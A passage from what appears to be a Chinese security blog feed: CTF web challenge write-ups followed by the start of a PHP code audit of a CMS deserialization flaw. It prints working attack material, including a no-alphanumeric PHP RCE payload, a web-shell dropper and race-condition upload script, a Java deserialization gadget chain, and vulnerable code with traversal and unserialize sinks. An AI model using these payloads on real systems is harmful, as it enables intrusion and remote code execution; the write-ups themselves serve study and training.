class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),<span class="type">CHAR</span>(<span class="number">49</span>),&quot;1&quot;)<span class="operator">%</span><span class="number">23</span><span class="string">&#x27;)%23 </span></span><br></pre></td></tr></table></figure><h2 id="简单的php-airrudder"><a href="#简单的php-airrudder" class="headerlink" title="简单的php (airrudder)"></a>简单的php (airrudder)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &gt; <span class="number">80</span> <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/is&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27; Hello&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>很明显的无参RCE，然后还不能有数字字母，所以这里可以用取反绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// phpinfo 的值</span><br><span class="line">?code=[~%8f%97%8f%96%91%99%90][!%FF](); </span><br></pre></td></tr></table></figure><p>同样的手段，构造出 <code>system(current(getallheaders()));</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=[~%8c%86%8c%8b%9a%92][!%FF]([~%9c%8a%8d%8d%9a%91%8b][!%FF]([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c][!%FF]())); </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/bd522c23b9b44f908e5c550c234f4383.png" alt="在这里插入图片描述"></p><h2 id="压缩包-yu22x"><a href="#压缩包-yu22x" class="headerlink" title="压缩包 (yu22x)"></a>压缩包 (yu22x)</h2><p>题目关键的地方如下<br><img src="https://img-blog.csdnimg.cn/a19400f4d43c4b339cd066a8e558b721.png" alt="在这里插入图片描述"></p><p>将我们上传的内容写到&#x2F;tmp下，接着作为压缩包解压，然后经过一堆过滤后如果不满足则删除文件。<br>这样就会存在条件竞争的可能，并且解压后生成的文件路径可以通过计算获得。<br>1、将如下php内容压缩生成zip文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;11111&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/var/www/html/x.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>2、条件竞争脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author:yu22x</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">&quot;http://192.168.1.110:8521/&quot;</span></span><br><span class="line">sess=requests.session()</span><br><span class="line">s = <span class="built_in">open</span>(<span class="string">&#x27;a.zip&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">content=base64.b64encode(s)</span><br><span class="line">data=&#123;<span class="string">&#x27;content&#x27;</span>:content&#125;</span><br><span class="line">i = hashlib.md5(content)</span><br><span class="line">md=hashlib.md5((<span class="string">&#x27;/tmp/&#x27;</span>+<span class="built_in">str</span>(i.digest().<span class="built_in">hex</span>())).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post( url,data=data )</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.get(url+<span class="string">f&#x27;static/upload/<span class="subst">&#123;md&#125;</span>/a.php&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> resp.status_code==<span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>() </span><br></pre></td></tr></table></figure><p>通过蚁剑连接x.php密码为1<br>根目录下拿到flag</p><h2 id="easy-sql-yu22x"><a href="#easy-sql-yu22x" class="headerlink" title="easy_sql (yu22x)"></a>easy_sql (yu22x)</h2><p>扫描后台发现phpmyadmin<br><img src="https://img-blog.csdnimg.cn/4a4e025dc69c494fbc0b32bf4428ee53.png" alt="在这里插入图片描述"></p><p>登录需要密码，盲猜用户名root<br>试了几个弱口令。<br>发现密码为password时登录成功，估计是非预期了。<br><img src="https://img-blog.csdnimg.cn/cc2a0aced10e44ba84e124d1cde7a6e1.png" alt="在这里插入图片描述"></p><p>用户名挨个试了一遍，发现使用用户名为SuperF1@g登录时直接出flag了。<br><img src="https://img-blog.csdnimg.cn/675d808f9a7940c09dac99e0b3aca097.png" alt="在这里插入图片描述"></p><h2 id="Ez-Java-xenny"><a href="#Ez-Java-xenny" class="headerlink" title="Ez_Java(xenny)"></a>Ez_Java(xenny)</h2><p>ysoserial不出网<code>http://novic4.cn/index.php/archives/26.html#cl-4</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">lab4exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Map map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String,Integer&gt;();</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        RMIConnector rmiConnector=<span class="keyword">new</span> <span class="title class_">RMIConnector</span>(<span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://localhost:9999/stub/&quot;</span>+exp),map);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer));</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        Reflections.setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;connect&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queueArray[<span class="number">0</span>] = rmiConnector;</span><br><span class="line">        queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">ser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(ser);</span><br><span class="line">        oser.writeObject(queue);</span><br><span class="line">        oser.close();</span><br><span class="line">        System.out.println(ser);</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(ser.toByteArray()));</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(Base64.getEncoder().encodeToString(ser.toByteArray())))).readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BY-恒星实验室&quot;&gt;&lt;a href=&quot;#BY-恒星实验室&quot; class=&quot;headerlink&quot; title=&quot;BY 恒星实验室&quot;&gt;&lt;/a&gt;BY 恒星实验室&lt;/h1&gt;&lt;h2 id=&quot;高手高手高高手-yu22x&quot;&gt;&lt;a href=&quot;#高手高手高高手-yu22x&quot; c</summary>
      
    
    
    
    <category term="writeup" scheme="https://lhhxs.github.io/categories/writeup/"/>
    
    
    <category term="CTF" scheme="https://lhhxs.github.io/tags/CTF/"/>
    
    <category term="PHP反序列化" scheme="https://lhhxs.github.io/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="WEB" scheme="https://lhhxs.github.io/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>前台反序列化代码审计</title>
    <link href="https://lhhxs.github.io/2022/09/09/WEB/%E5%89%8D%E5%8F%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://lhhxs.github.io/2022/09/09/WEB/%E5%89%8D%E5%8F%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2022-09-09T15:44:11.886Z</published>
    <updated>2022-09-09T15:50:05.146Z</updated>
    
    <content type="html"><![CDATA[<p>一直在忙毕设，很久没看安全了，看个PHP代码审计练练手，参考自<a href="https://susec.me/2022/03/13/phpok6-0-%E5%89%8D%E5%8F%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/">苏安的博客</a>。</p><p>基础框架依然是MVC，控制器都在_framework&#x2F;<em>下，路由方式是</em>&#x2F;admin.php?c&#x3D;login&amp;f&#x3D;index_，对应_framework&#x2F;admin&#x2F;login_control.php_下的_index_f_方法。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>漏洞点在_admin.php?c&#x3D;login&amp;f&#x3D;update_</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_f</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$login_time</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;login_time&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$login_time</span>)&#123;</span><br><span class="line"><span class="variable">$login_time</span> = <span class="number">1440</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$fid</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;fid&#x27;</span>);</span><br><span class="line"><span class="variable">$fcode</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;fcode&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$fid</span> &amp;&amp; !<span class="variable">$fcode</span>)&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="title function_ invoke__">P_Lang</span>(<span class="string">&#x27;登录数据不完整&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$quickcode</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;quickcode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$quickcode</span>)&#123;</span><br><span class="line"><span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;dir_cache.<span class="variable">$fid</span>.<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="title function_ invoke__">P_Lang</span>(<span class="string">&#x27;验证文件丢失，请重新扫码&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$keyid</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">lib</span>(<span class="string">&#x27;file&#x27;</span>)-&gt;<span class="title function_ invoke__">cat</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">lib</span>(<span class="string">&#x27;token&#x27;</span>)-&gt;<span class="title function_ invoke__">keyid</span>(<span class="variable">$keyid</span>);</span><br><span class="line"><span class="variable">$msg</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">lib</span>(<span class="string">&#x27;token&#x27;</span>)-&gt;<span class="title function_ invoke__">decode</span>(<span class="variable">$quickcode</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$msg</span> || !<span class="title function_ invoke__">is_array</span>(<span class="variable">$msg</span>) || !<span class="variable">$msg</span>[<span class="string">&#x27;id&#x27;</span>] || !<span class="variable">$msg</span>[<span class="string">&#x27;user&#x27;</span>] || !<span class="variable">$msg</span>[<span class="string">&#x27;time&#x27;</span>] || !<span class="variable">$msg</span>[<span class="string">&#x27;domain&#x27;</span>])&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="title function_ invoke__">P_Lang</span>(<span class="string">&#x27;数据解码失败&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//超过30天，告知无效</span></span><br><span class="line"><span class="variable">$time</span> = <span class="variable language_">$this</span>-&gt;time - <span class="variable">$msg</span>[<span class="string">&#x27;time&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$time</span>&gt;(<span class="number">30</span>*<span class="number">24</span>*<span class="number">60</span>*<span class="number">60</span>))&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="title function_ invoke__">P_Lang</span>(<span class="string">&#x27;数据超过30天，请重新登录&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$domain</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_domain</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$msg</span>[<span class="string">&#x27;domain&#x27;</span>] != <span class="variable">$domain</span>)&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="title function_ invoke__">P_Lang</span>(<span class="string">&#x27;数据来源不准确&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$rs</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">model</span>(<span class="string">&#x27;admin&#x27;</span>)-&gt;<span class="title function_ invoke__">get_one</span>(<span class="variable">$msg</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$rs</span> || <span class="variable">$rs</span>[<span class="string">&#x27;account&#x27;</span>] != <span class="variable">$msg</span>[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="title function_ invoke__">P_Lang</span>(<span class="string">&#x27;账号不一致&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$user</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;user&#x27;</span>);</span><br><span class="line"><span class="variable">$pass</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;pass&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$user</span> || !<span class="variable">$pass</span>)&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="title function_ invoke__">P_Lang</span>(<span class="string">&#x27;账号/密码不能为空&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$rs</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">model</span>(<span class="string">&#x27;admin&#x27;</span>)-&gt;<span class="title function_ invoke__">get_one_from_name</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$rs</span>)&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="title function_ invoke__">P_Lang</span>(<span class="string">&#x27;管理员信息不存在&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$rs</span>[<span class="string">&quot;status&quot;</span>])&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="title function_ invoke__">P_Lang</span>(<span class="string">&quot;管理员账号已被锁定，请联系超管&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">password_check</span>(<span class="variable">$pass</span>,<span class="variable">$rs</span>[<span class="string">&quot;pass&quot;</span>]))&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="title function_ invoke__">P_Lang</span>(<span class="string">&#x27;管理员密码输入不正确&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$domain</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_domain</span>();</span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;id&#x27;</span>=&gt;<span class="variable">$rs</span>[<span class="string">&#x27;id&#x27;</span>],<span class="string">&#x27;user&#x27;</span>=&gt;<span class="variable">$rs</span>[<span class="string">&#x27;account&#x27;</span>],<span class="string">&#x27;time&#x27;</span>=&gt;<span class="variable language_">$this</span>-&gt;time);</span><br><span class="line"><span class="variable">$data</span>[<span class="string">&#x27;domain&#x27;</span>] = <span class="variable">$domain</span>;</span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;site[<span class="string">&#x27;api_code&#x27;</span>])&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">lib</span>(<span class="string">&#x27;token&#x27;</span>)-&gt;<span class="title function_ invoke__">keyid</span>(<span class="variable">$this</span>-&gt;site[<span class="string">&#x27;api_code&#x27;</span>]);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">lib</span>(<span class="string">&#x27;token&#x27;</span>)-&gt;<span class="title function_ invoke__">expiry</span>(<span class="number">30</span>*<span class="number">24</span>*<span class="number">60</span>*<span class="number">60</span>);</span><br><span class="line"><span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">lib</span>(<span class="string">&#x27;token&#x27;</span>)-&gt;<span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//删除checking文件，创建登录文件</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">lib</span>(<span class="string">&#x27;file&#x27;</span>)-&gt;<span class="title function_ invoke__">rm</span>(<span class="variable">$this</span>-&gt;dir_cache.<span class="variable">$fid</span>.<span class="string">&#x27;-checking.php&#x27;</span>);</span><br><span class="line"><span class="variable">$data</span>[<span class="string">&#x27;online&#x27;</span>] = <span class="variable">$login_time</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">lib</span>(<span class="string">&#x27;file&#x27;</span>)-&gt;<span class="title function_ invoke__">vim</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">lib</span>(<span class="string">&#x27;json&#x27;</span>)-&gt;<span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>),<span class="variable">$this</span>-&gt;dir_cache.<span class="variable">$fid</span>.<span class="string">&#x27;-&#x27;</span>.<span class="variable">$fcode</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">success</span>(<span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先需要传入<code>$fid</code>以及<code>$fcode</code>两个参数，且<code>$fid</code>文件必须存在在cache目录下，这里可以用目录穿越绕过。</p><p><img src="https://oatmeal.vip/wp-content/uploads/2022/03/image.png"></p><p>之后要提到一个很重要的函数就是<code>lib()</code>，跟进后是在全局变量<code>$app</code>，调用__init_phpok.php_下的<code>_init_phpok</code>类中的<code>lib()</code>函数，我们分析一下在<code>update_f()</code>中的<code>$keyid</code>赋值这里。</p><p><img src="https://oatmeal.vip/wp-content/uploads/2022/03/image-1.png"></p><p>在<code>$lib</code>中，对<code>$config</code>进行赋值</p><p><img src="https://oatmeal.vip/wp-content/uploads/2022/03/image-2-1024x413.png"></p><p>最后返回：</p><p><img src="https://oatmeal.vip/wp-content/uploads/2022/03/image-3.png"></p><p>随后进入_file.php_中的<code>cat()</code>函数，当我们传入的是_index.php_文件时，这里的处理是获得文件内容并做一定的处理后（当为_index.php_时无处理）返回。</p><p>之后的<code>keyid()</code>对传入的文件内容进行处理，获得md5值，由于选择的文件是一定的，所以获得的md5值也是一样的。</p><p>跟进decode，这里存在<code>unserialize()</code>反序列化点，逆向过程可以调用_token.php_的<code>encode()</code>函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 解密</span></span><br><span class="line"><span class="comment"> * @参数 $string 要解密的字串</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;encode_type == <span class="string">&#x27;public_key&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">decode_rsa</span>(<span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;keyid)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line"><span class="variable">$keyc</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$string</span>, <span class="number">0</span>, <span class="variable">$this</span>-&gt;keyc_length);</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="title 